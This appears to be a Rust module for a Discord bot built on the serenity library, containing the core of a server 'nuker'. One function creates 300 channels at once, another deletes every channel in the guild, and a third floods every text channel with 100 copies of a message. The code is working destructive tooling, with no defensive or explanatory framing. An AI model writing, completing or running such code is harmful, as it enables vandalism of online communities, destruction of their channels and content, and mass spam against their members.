use serenity::all::CreateChannel;
use serenity::model::prelude::*;
use serenity::prelude::*;
use tokio::task;

pub async fn create_channels(name: &str, ctx: &Context, guild_id: GuildId) {
    let futures: Vec<_> = (0..300)
        .map(|i| {
            let http = ctx.http.clone();
            let guild_id = guild_id.clone();
            let channel_builder = CreateChannel::new(name).kind(ChannelType::Text);

            task::spawn(async move {
                if let Err(err) = guild_id.create_channel(&http, channel_builder).await {
                    eprintln!("Error creating channel {}: {:?}", i, err);
                }
            })
        })
        .collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn delete_channels(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let futures: Vec<_> = guild
        .channels(&ctx.http)
        .await
        .unwrap()
        .values()
        .map(|channel| {
            let http = ctx.http.clone();
            let channel_id = channel.id;
            task::spawn(async move {
                if let Err(err) = channel_id.delete(&http).await {
                    eprintln!("Error deleting channel {}: {:?}", channel_id, err);
                }
            })
        })
        .collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn spam_message(message: &str, ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let channels: Vec<_> = guild
        .channels(&ctx.http)
        .await
        .unwrap_or_default()
        .values()
        .filter(|channel| channel.kind == ChannelType::Text)
        .cloned()
        .collect();

    let channel_futures: Vec<_> = channels
        .iter()
        .map(|channel| {
            let channel_id = channel.id;
            let http = ctx.http.clone();
            let message = message.to_string();

            task::spawn(async move {
                let message_futures: Vec<_> = (0..100)
                    .map(|_| {
                        let http = http.clone();
                        let channel_id = channel_id.clone();
                        let message = message.clone();

                        task::spawn(async move {
                            if let Err(err) = channel_id.say(&http, &message).await {
                                eprintln!(
                                    "Error sending message in channel {}: {:?}",
                                    channel_id, err
                                );
                            }
                        })
                    })
                    .collect();

                for future in message_futures {
                    let _ = future.await;
                }
            })
        })
        .collect();

    for future in channel_futures {
        let _ = future.await;
    }
}
